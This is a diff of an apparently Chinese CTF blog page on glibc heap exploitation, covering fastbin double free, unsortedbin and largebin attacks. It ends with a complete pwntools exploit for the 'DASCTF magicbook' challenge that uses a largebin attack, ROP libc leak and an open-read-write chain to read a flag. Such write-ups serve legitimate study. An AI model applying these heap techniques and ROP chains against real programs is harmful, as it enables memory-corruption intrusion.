@@ -166,21 +166,21 @@
             
             <span class="tag">
                 
-                <a href="/tags/pwn/" style="color: #03a9f4">
+                <a href="/tags/pwn/" style="color: #ffa2c4">
                     pwn
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #00bcd4">
+                <a href="/tags/CTF/" style="color: #03a9f4">
                     CTF
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/heap/" style="color: #ffa2c4">
+                <a href="/tags/heap/" style="color: #00bcd4">
                     heap
                 </a>
             </span>
@@ -192,8 +192,89 @@
     <div class="content" v-pre>
         <hr>
 <h1 id="堆中bin的利用"><a href="#堆中bin的利用" class="headerlink" title="堆中bin的利用"></a>堆中bin的利用</h1><span id="more"></span>
-<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><h2 id="tachebin-attack"><a href="#tachebin-attack" class="headerlink" title="tachebin attack"></a>tachebin attack</h2><h2 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h2><p>作用：将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
-<p>1、首先是unsortedbin 的分配机制，超出了fastbin和tachebin范围的free chunk就会进入unsortedbin中，并且unsortedbin是先从末尾取出chunk进行分配的，后free的chunk会进入先free的chunk的前面。unsortedbin顾名思义，未分类的chunk，所以只要用户重新申请了chunk，unsortedbin中的chunk就会被重新分类，按照其chunk的大小分别进入smallbin、largebin…中。</p>
+<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><p>个人觉得fastbin attack总结起来其实利用就只有两个，double free、地址任意分配。   </p>
+<p>1、首先fastbin是由什么来进行管理的呢？<br>答案是fastbinY数组进行管理，这个数组是main_arena的一个成员变量，数组的最大下标是7.<br>由fastbin所管理的chunk，根据其chunk的大小的不同从而进入不同的fastbinY中，大小顺序是从0x20-0x80，依次对应不用的数组下标。    </p>
+<p>1、在fastbin中，它的prev_in_use位总是为1的。</p>
+<pre><code>static void _int_free (mstate av, mchunkptr p, int have_lock)
+&#123;
+size = chunksize (p);    //获取p的size
+check_inuse_chunk(av, p);//检查p的物理相邻的下一个堆块的inuse位是否置1
+
+//检查p的大小是否小于global_max_fast
+if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())
+    #if TRIM_FASTBINS
+        //检查p物理相邻的堆块是否是top chunk
+        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
+    #endif
+    ) 
+&#123;
+    //检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求
+    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
+        || __builtin_expect (chunksize (chunk_at_offset (p, size))
+                &gt;= av-&gt;system_mem, 0))
+        &#123;.......&#125;
+
+    //对chunk的data块通过memset赋值，但是默认情况下是不进行操作    
+    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
+    //设置 malloc_state的flag
+    set_fastchunks(av);
+
+    //获取p对应大小的fastbinY的索引
+    unsigned int idx = fastbin_index(size);
+    //fb指向对应大小的fastbinY的地址
+    fb = &amp;fastbin (av, idx);
+
+    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
+    // old为 对应大小的fastbinY的fd值，也就是第一个对块的地址
+    mchunkptr old = *fb, old2;
+    unsigned int old_idx = ~0u;
+    
+    do
+    &#123;
+        // Check that the top of the bin is not the record we are going to add
+        //检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)
+            if (__builtin_expect (old == p, 0))
+        &#123;
+            errstr = &quot;double free or corruption (fasttop)&quot;;
+            goto errout;
+        &#125;
+        //获取 fastbin中对应的bin的第一项的索引。
+            if (have_lock &amp;&amp; old != NULL)
+            old_idx = fastbin_index(chunksize(old));
+        //让  p 的fd指向 顶部的fastbin块
+            p-&gt;fd = old2 = old;
+    &#125;
+    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
+    //catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；
+    // *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)
+
+    //检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。
+    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))
+    &#123;
+            errstr = &quot;invalid fastbin entry (free)&quot;;
+            goto errout;
+    &#125;
+&#125;
+&#125;
+</code></pre>
+<p>2、在fastbin中常利用的attck就是double free<br> &#x2F;&#x2F;检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</p>
+<pre><code>        if (__builtin_expect (old == p, 0))
+    &#123;
+                errstr = &quot;double free or corruption (fasttop)&quot;;
+                goto errout;
+    &#125;
+</code></pre>
+<p>看到这一段源码，old对应的是先前free的chunk，p是当前free的chunk。如果两相同的chunk连续进行free程序就会抛出异常。<br>但是我们同时也可以看到，fastbin对doublefree的检查是十分松散的，因为这里只判断了old与p的指针相等。所以我们只需要A-》B-》A这样进行free，就可以绕过检查。   </p>
+<p>3、分配顺序<br>fastbin分配的chunk总是fastbinY数组所指向的第一个chunk。  </p>
+<p>fastbin是一个只有fd的单向链表并遵循先进后出的分配顺序。   </p>
+<p>4、attack<br>在fastbin attack中利用的除了double free，还有控制fd指针来进行任意地址分配。不过在进行分配之前需要满足一些条件来绕过检查。  </p>
+<pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）。  
+
+检测2：检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测。
+</code></pre>
+<p>所以我们选取的攻击目标地址的偏移size成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，比如当前fastbin所能管理的freechunk大小为0x70~0x80，而伪造的size成员处的数值为0x71、0x72这样的数值不能够符合要求的，但0x7f这样的地址就可以满足需要，因此构造完之后，攻击目标地址的伪造size成员成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，0x7f就可以满足.  </p>
+<h2 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h2><p>作用：将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
+<p>1、首先是unsortedbin 的分配机制，超出了fastbin和tachebin范围的free chunk就会进入unsortedbin中，并且unsortedbin是先从末尾取出chunk进行分配的，后free的chunk会进入先free的chunk的前面。unsortedbin顾名思义，未分类的chunk，所以只要用户重新申请了chunk，unsortedbin中的chunk就会被重新分类，按照其chunk的大小分别进入smallbin、largebin…中。在glibc2.26版本及以下时，还只有fastbin没有tachebin，这时候只要用户free的是大于0x80这个值时就会被free进unsortedbin中。</p>
 <p>2、unsortedbin的利用。主要就是利用其中的bk指针</p>
 <pre><code>//bck是倒数第二个chunk，victim里存的是倒数第一个chunk
 /* remove from unsorted list *   
@@ -237,9 +318,11 @@ bck-&gt;fd = unsorted_chunks (av);
 <p>（1）、chunk_A大于chunk_B</p>
 <p>（2）、chunk_A小于chunk_B</p>
 <p>（3）、chunk_A等于chunk_B</p>
-<p>又得知，largbin是按chunk由大到小进行排列的，小的那一方chunk靠近largebin<br>(1)、<br><img src="/images/u1.png" alt="图片"><br>又又得知，对chunk进行操作的三种情况</p>
-<p>（其中chunk_A是P3，chunk_B是P2，p2-&gt;bk是value1-0x10，p2-&gt;bk_nextsize是value2-0x20）<br>（2）、<br><img src="/images/u2.png" alt="图片"><br>（3）、<br><img src="/images/u3.png" alt="图片"></p>
-<p>另外需要注意，伪造的堆块fd_nextsize需要设置为0.不然无法通过以下unlink检查。<br>    size &#x3D; chunksize (victim);</p>
+<p>又得知，largbin是按chunk由大到小进行排列的，小的那一方chunk靠近largebin<br>又又得知，对chunk进行操作的三种情况      </p>
+<p>（其中chunk_A是P3，chunk_B是P2，p2-&gt;bk是value1-0x10，p2-&gt;bk_nextsize是value2-0x20）<br>(1)、vitim&gt;fwd<br><img src="/images/u1.png" alt="图片"><br>可以看到这里的victim被赋了一系列的值，bk_nextsize,bk都被fwd赋了值  </p>
+<p>（2）、victim&lt;fwd<br><img src="/images/u2.png" alt="图片">   </p>
+<p>（3）、victim&#x3D;&#x3D;fwd<br><img src="/images/u3.png" alt="图片"></p>
+<p>另外需要注意，伪造的堆块fd_nextsize需要设置为0.不然无法通过以下unlink检查。（需要进行伪造的free chunk是victim）<br>    size &#x3D; chunksize (victim);</p>
 <pre><code>/*  We know the first chunk in this bin is big enough to use. */
 assert ((unsigned long) (size) &gt;= (unsigned long) (nb));
 
@@ -288,7 +371,120 @@ unlink_chunk (av, victim);
 37     fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
 38
 39     return 0;
-40 &#125;
+40 &#125;     
+</code></pre>
+<h2 id="largbinattck-例题"><a href="#largbinattck-例题" class="headerlink" title="largbinattck 例题"></a>largbinattck 例题</h2><h3 id="DASCTF-magicbook"><a href="#DASCTF-magicbook" class="headerlink" title="DASCTF magicbook"></a>DASCTF magicbook</h3><p>于ubuntu题集中，magicbook文件夹  </p>
+<pre><code>#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+import os
+
+
+#context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+
+
+#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
+context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
+#终端更换
+
+p=process(&quot;./pwn&quot;)
+#p= remote()
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pwn&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+    
+def sa(content,payload):
+    p.sendafter(content,payload)
+    
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
+
+def exec_fmt(pad):#自动获取到fmt的pad
+        p = process(&quot;./fmt&quot;)
+        # send 还是 sendline以程序为准
+        p.send(pad)
+        return p.recv()
+def add(size):
+    sla(&quot;choice:&quot;,str(1))
+    sla(&quot;need?&quot;,str(size))
+
+def free(index):
+    sla(&quot;choice:&quot;,str(2))
+    sla(&quot;delete?&quot;,str(index))
+
+def edit(content):
+    sla(&quot;choice:&quot;,str(3))
+    sa(&quot;story!&quot;,content)
+
+
+p.recvuntil(b&quot;0x&quot;)
+gift=int(p.recv(12),16)-0x4010
+bk_adr=gift+0x4050
+bss=gift+0x4010
+print(&quot;gift=&quot;,hex(gift))
+print(&quot;book=&quot;,hex(bk_adr))
+                                                   #（largebin attack）
+                                                   
+add(0x4e0)
+add(0x100)
+add(0x4d0)
+free(0)
+p.sendline(b&#39;n&#39;)
+add(0x500)
+free(2)
+p.recvuntil(b&quot;(y/n)&quot;)
+p.sendline(b&#39;y&#39;)
+p.recvuntil(b&quot;write?&quot;)
+p.sendline(b&#39;0&#39;)
+p.recvuntil(b&quot;content: &quot;)
+p.send(p64(0)*2+p64(bk_adr-0x20))
+add(0x500)                                         #（largebin attack）
+
+
+
+rdi=0x0000000000001863+gift
+payload=b&#39;a&#39;*0x28+p64(rdi)+p64(elf.got[&#39;puts&#39;]+gift)+p64(gift+elf.plt[&#39;puts&#39;])+p64(gift+0x15E1)
+edit(payload)
+#p.recvuntil(b&#39;a&#39;*0x28)
+got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;got=&quot;,hex(got))
+got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;got=&quot;,hex(got))
+base=got-libc.sym[&#39;puts&#39;]
+print(&quot;base=&quot;,hex(base))
+rsi=base+0x000000000002be51
+rdx_rbx=0x00000000000904a9+base
+o=libc.sym[&#39;open&#39;]+base
+r=libc.sym[&#39;read&#39;]+base
+w=libc.sym[&#39;write&#39;]+base
+gets=libc.sym[&#39;gets&#39;]+base
+bss=gift+0x4090
+print(&quot;bss=&quot;,hex(bss))
+payload=b&#39;a&#39;*0x28+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x8)+p64(0)+p64(r)+p64(gift+0x15E1)
+p.send(payload)
+sleep(0.1)
+p.send(b&#39;flag\x00\x00\x00&#39;)
+print(&quot;gets=&quot;,hex(gets))
+sleep(0.1)
+sleep(0.1)
+orw=p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(w)
+p.send(b&#39;a&#39;*0x28+orw)
+inter()
 </code></pre>
 <hr>
 
